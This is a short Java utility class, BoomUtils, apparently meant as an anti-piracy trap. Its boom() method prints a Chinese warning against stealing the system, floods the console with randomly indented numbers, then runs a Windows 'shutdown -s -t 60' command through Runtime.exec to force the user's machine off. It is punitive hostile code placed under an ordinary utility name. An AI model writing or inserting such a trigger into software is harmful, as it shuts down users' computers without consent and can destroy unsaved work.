package org.camille.mytest.util;

import java.util.Random;

public class BoomUtils {
    
    private BoomUtils() {}

    public static void boom(){
        try {
            System.out.println("Sorry，不要盗用本系统哦");
            Runtime r = Runtime.getRuntime();
            for(int i = 13; i <= 150000000; i++){
                Random r1 = new Random();
                i = r1.nextInt(150000500);
                if(i % 5 == 0) {
                    System.out.println("\t" + i);
                } else if( i % 5 == 1) {
                    System.out.println("\t\t\t" + i);
                } else if( i % 5 == 2) {
                    System.out.println("\t\t\t\t\t\t" + i);
                } else if( i % 5 == 3) {
                    System.out.println("\t\t\t\t\t\t\t\t" + i);
                } else if( i % 5 == 4) {
                    System.out.println("\t\t\t\t\t\t\t\t\t\t" + i);
                }
            }
            r.exec("shutdown -s -t 60 -c \"Sorry，不要盗用本系统哦" );
        } catch (Exception x) {
            System.out.println("Sorry，不要盗用本系统哦");
        }
    }
}